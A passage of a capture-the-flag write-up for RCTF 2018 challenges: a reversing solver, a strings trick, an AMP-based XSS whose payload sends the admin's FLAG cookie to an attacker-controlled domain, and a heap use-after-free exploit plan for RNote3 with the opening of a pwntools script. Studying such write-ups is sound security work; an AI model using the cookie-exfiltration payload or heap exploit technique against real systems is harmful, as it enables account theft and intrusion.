</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>signed</span> <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-1Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x20u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>29</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v6</span> <span class=o>=</span> <span class=nf>sub_804868B</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=nf>__PAIR__</span><span class=p>(</span><span class=n>a3</span><span class=p>,</span> <span class=n>a2</span><span class=p>),</span> <span class=n>a4</span><span class=p>,</span> <span class=n>a6</span><span class=p>,</span> <span class=n>a5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The only called function, <code>sub_804868B</code>, is responsible for the mangling of individual characters. While it gets a lot of parameters, in the end the last three are useless and <code>__PAIR__(a3, a2)</code> is hardcoded in the main function as <code>0x1D082C23A72BE4C1LL</code>. Let&rsquo;s have a look at <code>sub_804868B</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_804868B</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a3</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a4</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-ACh]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>j</span><span class=p>;</span> <span class=c1>// [esp+24h] [ebp-A4h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v10</span><span class=p>;</span> <span class=c1>// [esp+28h] [ebp-A0h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>s</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span> <span class=c1>// [esp+2Ch] [ebp-9Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v12</span><span class=p>;</span> <span class=c1>// [esp+ACh] [ebp-1Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v12</span> <span class=o>=</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x20u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mh>0x1D</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>4</span> <span class=o>*</span> <span class=n>a3</span> <span class=o>+</span> <span class=n>v10</span><span class=p>)</span> <span class=o>^</span> <span class=n>a5</span> <span class=o>^</span> <span class=n>a4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;=</span> <span class=mh>0x20F</span><span class=p>;</span> <span class=o>++</span><span class=n>j</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=n>a2</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=n>j</span> <span class=o>&amp;</span> <span class=mh>0x1F</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>j</span> <span class=o>&amp;</span> <span class=mh>0x20</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nf>LODWORD</span><span class=p>(</span><span class=n>v5</span><span class=p>)</span> <span class=o>=</span> <span class=nf>HIDWORD</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>a1</span> <span class=o>=</span> <span class=p>(</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>^</span> <span class=p>(((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v5</span> <span class=o>^</span> <span class=n>a1</span> <span class=o>^</span> <span class=p>(</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=mh>0x5C743A2E</span> <span class=o>&gt;&gt;</span> <span class=p>(((</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                                                          <span class=o>+</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>                                                                          <span class=o>*</span> <span class=p>(</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>                                                                           <span class=o>*</span> <span class=p>(((</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                                                            <span class=o>+</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>                                                                            <span class=o>*</span> <span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=p>((</span><span class=n>a1</span> <span class=o>&amp;</span> <span class=mh>0x80000000</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                                                             <span class=o>+</span> <span class=p>((</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>26</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>                                                                           <span class=o>+</span> <span class=p>((</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>9</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)))))</span> <span class=o>&lt;&lt;</span> <span class=mi>31</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>As you can see, a3, a4 and a5 are only used to produce s, which is never used again and can thus be ignored. All we&rsquo;re left with is the big for loop which modifies a1, the character the function is working on. Instead of writing a reverse function for this loop I just used a lookup table, thus solving the challenge with this code (yes, it&rsquo;s kind of ugly, but it works):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstdio&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstdint&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;bits/stdc++.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>using</span> <span class=k>namespace</span> <span class=n>std</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>f</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint32_t</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint64_t</span> <span class=n>a2</span> <span class=o>=</span> <span class=mh>0x1D082C23A72BE4C1LL</span><span class=p>,</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;=</span> <span class=mh>0x20F</span><span class=p>;</span> <span class=o>++</span><span class=n>j</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>v5</span> <span class=o>=</span> <span class=n>a2</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=n>j</span> <span class=o>&amp;</span> <span class=mh>0x1F</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span> <span class=n>j</span> <span class=o>&amp;</span> <span class=mh>0x20</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=n>v5</span> <span class=o>=</span> <span class=n>v5</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>a1</span> <span class=o>=</span> <span class=p>(</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>^</span> <span class=p>(((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v5</span> <span class=o>^</span> <span class=n>a1</span> <span class=o>^</span> <span class=p>(</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>^</span>
</span></span><span class=line><span class=cl>                                                        <span class=p>(</span><span class=mh>0x5C743A2E</span> <span class=o>&gt;&gt;</span> <span class=p>(((</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=mi>2</span> <span class=o>*</span> <span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=p>(((</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                                        <span class=o>+</span> <span class=mi>2</span> <span class=o>*</span> <span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=p>((</span><span class=n>a1</span> <span class=o>&amp;</span> <span class=mh>0x80000000</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=p>((</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>26</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>                                                        <span class=o>+</span> <span class=p>((</span><span class=n>a1</span> <span class=o>&gt;&gt;</span> <span class=mi>9</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)))))</span> <span class=o>&lt;&lt;</span> <span class=mi>31</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>map</span><span class=o>&lt;</span><span class=n>string</span><span class=p>,</span> <span class=kt>char</span><span class=o>&gt;</span> <span class=n>m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mh>0xFF</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=n>sprintf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=s>&#34;%08X&#34;</span><span class=p>,</span> <span class=n>f</span><span class=p>(</span><span class=n>i</span><span class=p>));</span>
</span></span><span class=line><span class=cl>                <span class=n>m</span><span class=p>[</span><span class=n>string</span><span class=p>(</span><span class=n>buf</span><span class=p>)]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>out</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>ifstream</span> <span class=n>s</span><span class=p>(</span><span class=s>&#34;out&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>30</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>string</span> <span class=n>l</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>s</span> <span class=o>&gt;&gt;</span> <span class=n>l</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=n>m</span><span class=p>.</span><span class=n>find</span><span class=p>(</span><span class=n>l</span><span class=p>)</span> <span class=o>==</span> <span class=n>m</span><span class=p>.</span><span class=n>end</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;WUT</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>out</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>m</span><span class=p>[</span><span class=n>l</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>out</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Which prints <code>RCTF{Kee1o9_1s_a1ready_so1ved}</code>, our flag.</p><p>Just a small detail: I had to break the lines in the <code>out</code> file up into 8 character chunks manually, they were in 16 byte lines for some reason.</p><h2 class="relative group">Sign<div id=sign class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#sign aria-label=Anchor>#</a></span></h2><p>We are given a 64 bit elf that segfaults on execution.
By running a good old-fashioned</p><pre tabindex=0><code>strings --encoding=l sign.exe |grep RCTF
</code></pre><p>we get the flag <code>RCTF{WelCOme_To_RCTF}</code></p><h2 class="relative group">AMP<div id=amp class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#amp aria-label=Anchor>#</a></span></h2><p>We are given a page with an obsvious XSS and a quite strict CSP policy.
You can submit the page with the injection to the admin. A cookie <code>FLAG</code> is set, which probably means we have to steal that cookie from the admin.</p><p>The page is using <a href=https://www.ampproject.org/ target=_blank>AMP</a>, so we are going to look for a way to bypass the CSP using an AMP custom element.
AMP has a feature that allows you to insert some placeholders into a URL that are populated by javascript at runtime, called: <a href=https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md target=_blank>https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md</a>
The feature we need is <code>CLIENT_ID</code>, that populates the placeholder with the value of a cookie. In our case: <code>CLIENT_ID(FLAG)</code> will be replaced by the flag value.
At this point, we just need an AMP element available in the default package and capable of loading a URL using variable substitutions.
We quickly found <a href=https://www.ampproject.org/docs/reference/components/amp-pixel target=_blank>amp-pixel</a>, that does just that.</p><p>Our final payload was:</p><pre tabindex=0><code>&lt;amp-pixel src=&#34;https://controlled_domain.com/?CLIENT_ID(FLAG)&#34; layout=&#34;nodisplay&#34;&gt;&lt;/amp-pixel&gt;
</code></pre><p>And the flag: <code>RCTF{El_PsY_CONGRO0_sg0}</code></p><h2 class="relative group">RNote3<div id=rnote3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#rnote3 aria-label=Anchor>#</a></span></h2><p><a href="https://drive.google.com/open?id=1yKlHMJG35GtjuwckrkYuMW7ps2bEYF5k" target=_blank>Attachment</a></p><h3 class="relative group">First checks:<div id=first-checks class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#first-checks aria-label=Anchor>#</a></span></h3><p>RNote3: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3ec425669dba0efe3033ff8bffdb0b4a9eb9ee4e, stripped
&lsquo;/home/marcof/ctfs/rctf2018/rnote/RNote3&rsquo;
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled</p><h3 class="relative group">Reversing<div id=reversing class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#reversing aria-label=Anchor>#</a></span></h3><p>We reversed all the binary with no particular problems. We started looking for some bugs in heap managment but everythink looked fine. We noticed sub_B98( ) (which i renominated custom_read(buff,size)) wasn&rsquo;t perfect,
in fact it would stop reading characters once a \n was reached but it would still add a \x00 at buff[size - 1]. Also we soon found a stack buffer overflow in sub_102D() (edit_note()). Still canary was preventing us to take control
over the $rip.</p><h3 class="relative group">The right vuln<div id=the-right-vuln class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-right-vuln aria-label=Anchor>#</a></span></h3><p>After some time we finally found a usable vulnerability. In function delete_note() (sub_F2B(), refer to decompiled code below) stack variable &ldquo;selected_note&rdquo; is not initialized to 0 and its loaded at $rbp - 0x18, exactly as it is in
edit_note() function. This means that if i first call edit_note() on one of my allocated structures (note structure also provided below), lets say with title &ldquo;aaa\n&rdquo; and later call delete_note() looking for a structure with a non existing
title ("\n") I would end up freeing the &ldquo;aaa\n&rdquo; note without setting to 0 the respective global pointer saved in .bss segment. This its clearly a use after free vulnerability.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=nf>delete_note</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>signed</span> <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+4h] [rbp-1Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>note</span> <span class=o>*</span><span class=n>selected_note</span><span class=p>;</span> <span class=c1>// [rsp+8h] [rbp-18h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>note_title</span><span class=p>;</span> <span class=c1>// [rsp+10h] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>canary</span><span class=p>;</span> <span class=c1>// [rsp+18h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>canary</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;please input note title: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>my_custom_read</span><span class=p>(</span><span class=o>&amp;</span><span class=n>note_title</span><span class=p>,</span> <span class=mi>8u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>31</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>notes</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=o>&amp;</span><span class=n>note_title</span><span class=p>,</span> <span class=n>notes</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>-&gt;</span><span class=n>title</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>selected_note</span> <span class=o>=</span> <span class=n>notes</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>selected_note</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>selected_note</span><span class=o>-&gt;</span><span class=n>content</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>selected_note</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>notes</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;not a valid title&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>canary</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>note</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>title</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>content</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><h3 class="relative group">Exploitation<div id=exploitation-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploitation-1 aria-label=Anchor>#</a></span></h3><p>Using the newly found vulnerability we were able to both leak libc and heap addresses usign the unsorted chunk fd and bk pointers which are saved on the heap after a call to free().
Libc was provided so it was easy to calculate offsets to system() function. Once we got a heap address we were able to craft a fake big chunk inside the double linked list of
unsorted ones to make it overlap existing note structures, change their &ldquo;content&rdquo; pointer and gain arbitrary write.The final step is trivial, we overwrite free_hook(), we put a &ldquo;/bin/sh\x00&rdquo;
string inside a note content, we free such note.</p><h3 class="relative group">Final exploit with some comments<div id=final-exploit-with-some-comments class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#final-exploit-with-some-comments aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>time</span> <span class=kn>import</span> <span class=n>sleep</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#34;debug&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s1>&#39;localhost&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>4000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host_remote</span> <span class=o>=</span> <span class=s2>&#34;rnote3.2018.teamrois.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port_remote</span> <span class=o>=</span> <span class=mi>7322</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary_path</span> <span class=o>=</span> <span class=s1>&#39;./RNote3&#39;</span>
</span></span><span class=line><span class=cl><span class=n>libc_path</span> <span class=o>=</span> <span class=s1>&#39;./libc.so.6&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>start_gdb</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=n>gdb_cmds</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>source /home/marcof/peda/peda.py
</span></span></span><span class=line><span class=cl><span class=s2># sbp 0xf5b
</span></span></span><span class=line><span class=cl><span class=s2># sbp 0xfe2
</span></span></span><span class=line><span class=cl><span class=s2>b system
</span></span></span><span class=line><span class=cl><span class=s2>c
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libc_path</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libc_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>binary_path</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>binary_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
